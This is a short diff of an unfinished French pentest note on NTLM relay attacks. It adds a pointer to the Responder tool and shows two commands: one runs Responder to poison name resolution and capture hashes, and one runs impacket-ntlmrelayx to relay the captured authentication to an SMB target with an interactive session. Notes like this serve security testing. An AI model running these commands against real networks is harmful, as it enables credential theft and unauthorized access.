@@ -4,6 +4,8 @@ description: A finir
 
 # NTLM Relay
 
+Prendre la dernière version de Responder ([https://github.com/lgandx/Responder](https://github.com/lgandx/Responder))
+
 ```
 sudo responder -I eth0 -vrd
 sudo impacket-ntlmrelayx -t smb://<IP> -i -debug
